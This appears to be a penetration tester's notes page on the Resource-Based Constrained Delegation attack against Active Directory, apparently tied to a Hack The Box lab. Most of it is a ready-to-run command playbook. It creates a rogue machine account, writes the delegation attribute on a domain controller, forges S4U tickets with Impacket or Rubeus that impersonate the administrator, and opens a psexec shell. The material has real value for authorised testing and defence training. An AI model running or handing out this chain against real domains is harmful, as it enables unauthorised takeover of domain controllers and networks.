---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# RBCD

## TL;DR

The attack targets a domain computer (SPN related to the target domain computer).

### Prerequisites

1. A domain account with `WRITE` access to the target computer for setting the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to it.
2. Permission to create new computer accounts (`MachineAccountQuota`).
3. LDAP(S) (`389`/`636`) and SAMR (`445`) access to the DC.
4. Kerberos (`88`) access to the DC.

### Attack

1. Create a fake computer.
2. Set `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the target.
3. Request impersonated Service Tickets (`S4U`) for the target computer.

Impersonated ST[^1]s may allow high-level access to services on the target like CIFS, HTTP, etc, if the impersonated account has privileges.

## Linux

{% code overflow="wrap" %}
```bash
# add a machine account
impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-ip <ip> '<domain/user:pass>'
# set rbcd attribute
impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'dc$' -action 'write' '<domain/user:pass>' -dc-ip 10.10.11.174
# generate ST for the admin account
impacket-getST -spn 'cifs/<fqdn>' -impersonate 'administrator' 'domain/ATTACKERSYSTEM$:Summer2018!'
```
{% endcode %}

For an example of the above process check [Support](../../../../../boxes/boxes/easy/support.md#rbcd).

## Windows

```powershell
# create a computer account
.\StandIn.exe --computer <name> --make
# get the SID of the computer account
Get-ADComputer -Filter * | Select-Object Name, SID
# set the RBCD attribute
.\StandIn.exe --computer <dc> --sid <sid>
```

We need the value of the password md4-encrypted for Rubeus.

```bash
python3
>>> import hashlib,binascii
>>> hash = hashlib.new('md4', "<pass>".encode('utf-16le')).digest()
>>> print(binascii.hexlify(hash))
```

{% code overflow="wrap" %}
```powershell
# generate the ST
.\Rubeus.exe s4u /user:<name> /rc4:<value> /impersonateuser:administrator /msdsspn:cifs/<fqdn> /nowrap /ptt
```
{% endcode %}

Although the ticket is generated, it does not work locally. Copy paste the b64 encoded block locally, decode it, convert it, and then use it.

```bash
# paste the ticket
nano ticket.b64
# decode it
cat ticket.b64 | base64 -d > ticket.kirbi
# convert it from kirbit to ccache for Linux usage
impacket-ticketConverter ticket.kirbi ticket.ccache
# export the ticket
export KRB5CCNAME=<ticket-path>
# use the ticket
impacket-psexec -k -no-pass <domain>/administrator@<fqdn> -dc-ip <ip>
```

## Resources

{% tabs %}
{% tab title="Demo" %}
{% embed url="https://youtu.be/xMTCZt5DRB0?t=504" %}
{% endtab %}

{% tab title="Deep Dive" %}
{% embed url="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" %}
{% endtab %}

{% tab title="Video-Presentation" %}
{% embed url="https://www.youtube.com/watch?v=vlKwCTvp5_w" %}
{% endtab %}
{% endtabs %}



[^1]: Service Ticket
